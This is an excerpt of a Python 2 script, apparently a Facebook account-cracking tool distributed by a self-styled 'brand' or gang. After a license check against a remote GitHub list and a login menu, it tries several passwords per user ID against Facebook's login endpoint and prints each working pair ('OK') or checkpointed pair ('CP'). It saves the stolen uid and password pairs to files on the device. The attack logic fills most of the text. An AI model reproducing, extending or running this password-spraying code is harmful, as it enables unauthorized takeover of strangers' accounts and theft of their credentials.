...
\033[1;92m                     🄱🅁🄰🄽🄳        
\033[1;97m **********************************
\033[1;93m  SCRIPT MAKER  :  ALEY X AHITSHAM X RAJA HASHIR
\033[1;96m  GANG     :  WWK BRAND NAME IS BRAND
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/aleykashanbrand/WWK/main/mpg.txt').text
    if to in r:
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] ALEY X ZAIN Brand'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─ZAIN➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://facebook.com/YOURE.SISTERS.CRUSH/')
    else:
        print ''
...
def menu():
    ...
    print '\033[1;92m[2] Follow HITTLER OWNER ZAIN'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─ZAIN➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ' \033[1;90mFor-example : \033[1;97m555666,666777,223344,888999\033[1;94m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;95mITz AlEY X AHITSHAM BRAND \033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[ALEY-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[ALEY-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[ALEY-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[ALEY-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MRP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[ALEY-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[ALEY-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MRP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[ALEY-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[ALEY-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MRP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
